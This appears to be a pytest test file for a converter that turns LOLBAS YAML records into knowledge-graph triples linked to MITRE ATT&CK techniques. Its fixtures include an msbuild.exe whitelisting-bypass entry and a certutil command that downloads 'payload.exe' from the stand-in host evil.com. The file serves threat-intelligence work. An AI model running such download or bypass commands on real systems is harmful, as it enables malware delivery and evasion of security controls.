"""Tests for convert_lolbas.py — LOLBAS YAML -> SPO triples converter."""

import pytest
import yaml

from convert_lolbas import extract_lolbas_triples

SAMPLE_BINARY = {
    "Name": "Msbuild.exe",
    "Description": "Microsoft Build Engine",
    "Commands": [
        {
            "Command": "msbuild.exe payload.xml",
            "MitreID": "T1127.001",
            "Category": "Execute",
            "Usecase": "Execute arbitrary code",
            "Privileges": "User",
            "OperatingSystem": "Windows 10",
        },
        {
            "Command": "msbuild.exe payload2.xml",
            "MitreID": "T1127",
            "Category": "AWL Bypass",
            "Usecase": "Bypass application whitelisting",
            "Privileges": "Admin",
            "OperatingSystem": "Windows 11",
        },
    ],
    "Full_Path": [
        {"Path": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Msbuild.exe"},
        {"Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Msbuild.exe"},
    ],
    "Resources": [
        {"Link": "https://example.com/lolbas-msbuild"},
    ],
}

SAMPLE_BINARY_MINIMAL = {
    "Name": "Certutil.exe",
    "Description": "Certificate utility",
    "Commands": [
        {
            "Command": "certutil -urlcache -split -f http://evil.com/payload.exe",
            "MitreID": "T1105",
            "Category": "Download",
        },
    ],
}

SAMPLE_NO_NAME = {
    "Description": "No name field",
}


@pytest.fixture
def sample_dir(tmp_path):
    binaries = tmp_path / "yml" / "OSBinaries"
    binaries.mkdir(parents=True)
    scripts = tmp_path / "yml" / "OSScripts"
    scripts.mkdir(parents=True)
    (binaries / "Msbuild.yml").write_text(yaml.dump(SAMPLE_BINARY))
    (binaries / "Certutil.yml").write_text(yaml.dump(SAMPLE_BINARY_MINIMAL))
    (scripts / "NoName.yml").write_text(yaml.dump(SAMPLE_NO_NAME))
    return str(tmp_path)


class TestLolbasTriples:
    def test_basic_properties(self, sample_dir):
        triples = list(extract_lolbas_triples(sample_dir))
        ts = {t[:3] for t in triples}

        assert ("Msbuild.exe", "rdf:type", "LOLBinary") in ts
        assert ("Msbuild.exe", "name", "Msbuild.exe") in ts
        assert ("Msbuild.exe", "description", "Microsoft Build Engine") in ts

    def test_technique_links(self, sample_dir):
        triples = list(extract_lolbas_triples(sample_dir))
        ts = {t[:3] for t in triples}

        assert ("Msbuild.exe", "maps-to-technique", "T1127.001") in ts
        assert ("Msbuild.exe", "maps-to-technique", "T1127") in ts

    def test_command_properties(self, sample_dir):
        triples = list(extract_lolbas_triples(sample_dir))
        ts = {t[:3] for t in triples}

        assert ("Msbuild.exe", "category", "Execute") in ts
        assert ("Msbuild.exe", "usecase", "Execute arbitrary code") in ts
        assert ("Msbuild.exe", "privileges", "User") in ts
        assert ("Msbuild.exe", "platform", "Windows 10") in ts

    def test_full_paths(self, sample_dir):
        triples = list(extract_lolbas_triples(sample_dir))
        paths = {t[2] for t in triples if t[1] == "full-path"}

        assert "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Msbuild.exe" in paths
        assert "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Msbuild.exe" in paths

    def test_references_in_meta(self, sample_dir):
        triples = list(extract_lolbas_triples(sample_dir))
        rdf_triples = [t for t in triples if t[0] == "Msbuild.exe" and t[1] == "rdf:type"]
        assert len(rdf_triples) == 1
        assert "references" in rdf_triples[0][5]
        assert "https://example.com/lolbas-msbuild" in rdf_triples[0][5]

    def test_no_name_skipped(self, sample_dir):
        triples = list(extract_lolbas_triples(sample_dir))
        subjects = {t[0] for t in triples}
        assert "" not in subjects

    def test_second_binary(self, sample_dir):
        triples = list(extract_lolbas_triples(sample_dir))
        ts = {t[:3] for t in triples}

        assert ("Certutil.exe", "rdf:type", "LOLBinary") in ts
        assert ("Certutil.exe", "maps-to-technique", "T1105") in ts

    def test_triple_count(self, sample_dir):
        triples = list(extract_lolbas_triples(sample_dir))
        assert len(triples) > 10
        assert len(triples) < 100
